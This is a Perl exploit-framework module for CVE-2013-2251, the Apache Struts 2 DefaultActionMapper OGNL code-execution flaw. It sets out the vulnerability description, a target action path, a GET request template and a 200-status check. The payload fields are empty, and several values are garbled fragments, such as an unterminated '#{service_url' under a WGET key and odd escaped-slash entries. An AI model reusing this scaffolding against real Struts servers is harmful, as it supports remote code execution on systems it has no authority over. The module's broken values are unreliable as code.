package STRUTS::MSF::StrutsDefaultActionMapper;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "StrutsDefaultActionMapper";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "\$"          => "\\\\u002f",
  "CHMOD"       => 777,
  "CVE"         => "CVE-2013-2251",
  "DESCRIPTION" => "

        The Struts 2 DefaultActionMapper supports a method for short-circuit navigation

        state changes by prefixing parameters with \"action:\" or \"redirect:\", followed by

        a desired navigational target expression. This mechanism was intended to help with

        attaching navigational information to buttons within forms.



        In Struts 2 before 2.3.15.1 the information following \"action:\", \"redirect:\" or

        \"redirectAction:\" is not properly sanitized. Since said information will be

        evaluated as OGNL expression against the value stack, this introduces the

        possibility to inject server side code.

      ",
  "METHOD"      => "GET",
  "MSF_MODULE"  => "struts_default_action_mapper",
  "N"           => "\\\\u002f",
  "OSVDB"       => 95405,
  "PATHS"       => ["struts2-blank/example/HelloWorld.action"],
  "REFERENCES"  => ["http://struts.apache.org/release/2.3.x/docs/s2-016.html"],
  "TITLE"       => "Apache Struts 2 DefaultActionMapper Prefixes OGNL Code Execution",
  "WGET"        => "#{service_url",
  VARIABLES => {
    'URI' =>       { DESCRIPTION => "", VALUE => "" },
    'PROOF' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "Action URI",
  VALUE => "/struts2-blank/example/HelloWorld.action",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
